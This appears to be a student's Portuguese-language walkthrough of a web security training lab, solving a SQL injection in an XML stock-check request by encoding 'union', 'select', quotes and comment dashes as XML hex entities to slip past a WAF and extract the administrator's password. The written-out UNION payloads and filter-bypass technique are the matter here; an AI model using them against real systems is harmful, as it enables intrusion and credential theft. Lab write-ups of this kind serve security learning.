# Lab: SQL injection with filter bypass via XML encoding

## Enunciado (traduzido)

Este lab contém uma vulnerabilidade de SQL injection no seu recurso de verificação de estoque (*stock check*). Os resultados da consulta são retornados na resposta da aplicação, permitindo que você utilize um ataque UNION para recuperar dados de outras tabelas.

O banco de dados contém uma tabela `users`, que armazena os nomes de usuário e senhas de usuários cadastrados. Para resolver o lab, realize um ataque de SQL injection para extrair as credenciais do usuário administrador e faça login em sua conta.

*(Dica: Um Web Application Firewall (WAF) bloqueará requisições que contenham sinais óbvios de um ataque de SQL injection. Você precisará encontrar uma forma de ofuscar sua query maliciosa para burlar esse filtro).*

## O que fiz

Neste lab precisamos procurar onde estão os pontos de entrada. Navegando pela página, encontramos o botão de **"Check stock"**.

Ao interceptar essa requisição no Burp Suite, vemos que ela envia uma estrutura XML com duas tags:

```xml
<productId>
    1
</productId>
<storeId>
    1
</storeId>
```

Para testar se o backend trata esses parâmetros diretamente como números ou como texto (com aspas `'` ou `"` na query), colocamos um `+1` ao lado do valor `1` em cada um dos dois campos, testando um de cada vez:

* A resposta da aplicação se alterou ao somar, o que indica que ele **pode** estar usando o valor diretamente como número e não como string.

Para tirar a dúvida e ter certeza se realmente não precisa de aspas, tentamos injetar um `order by 1--`:

```xml
<productId>
    1 order by 1--
</productId>
<storeId>
    1
</storeId>
```

Ao enviar, a aplicação retornou:  
`"Attack detected"`

### Burlando o filtro com o CyberChef

Como o WAF bloqueou a requisição, fomos ao [**CyberChef**](https://gchq.github.io/CyberChef/) para converter e ofuscar os caracteres usando a receita **`To HTML Entity`**, com as seguintes configurações:
- `Convert all characters`
- `Hex entities`

O primeiro teste foi converter apenas os traços do comentário `--`, que viraram `&#x2d;&#x2d;`.

Ao trocar `--` por `&#x2d;&#x2d;`, a aplicação parou de acusar ataque detectado. Testamos então nos dois campos:
* No `<productId>`, a injeção não funcionou.
* No `<storeId>`, funcionou com sucesso!

Isso confirmou de fato que o campo `storeId` está sendo inserido diretamente como número na query do banco.

### Descobrindo a quantidade de colunas

Agora precisamos saber quantas colunas a consulta original possui. Testamos:

```xml
<storeId>1 order by 2 &#x2d;&#x2d;</storeId>
```

Com o `order by 2` a consulta não retornou nada, confirmando que devemos trabalhar com o retorno de **apenas 1 coluna**.

### Montando o payload e descobrindo quais caracteres o WAF bloqueia

Como temos apenas 1 coluna, montamos um `UNION SELECT` concatenando `username` e `password` da tabela `users` com o separador `~`:

```sql
1 union select username||'~'||password from users --
```

Lembrando que precisamos usar o comentário codificado (`&#x2d;&#x2d;`):

```xml
<storeId>1 union select username||'~'||password from users &#x2d;&#x2d;</storeId>
```

O WAF detectou o ataque novamente. Passamos a testar a codificação de cada elemento suspeito:

Testamos codificar as aspas simples `'` para `&#x27;`:
```xml
<storeId>1 union select username||&#x27;~&#x27;||password from users &#x2d;&#x2d;</storeId>
```
*Ainda detectou ataque.*

Testamos codificar a letra `s` da palavra `select` para `&#x73;`:
```xml
<storeId>1 union &#x73;elect username||&#x27;~&#x27;||password from users &#x2d;&#x2d;</storeId>
```
*Ainda detectou ataque.*

Testamos codificar também a letra `u` da palavra `union` para `&#x75;`:
```xml
<storeId>1 &#x75;nion &#x73;elect username||&#x27;~&#x27;||password from users &#x2d;&#x2d;</storeId>
```

Dessa vez passou pelo WAF! O backend decodificou o XML e executou o comando no banco, retornando o usuário e a senha do administrador concatenados na resposta:

```text
administrator~su7a3v078p2t2q3j5rka
```

Com a senha em mãos, fomos até `/login`, autenticamos com o usuário `administrator` e concluímos o lab.

---

[⬅ Voltar](../../../README.md)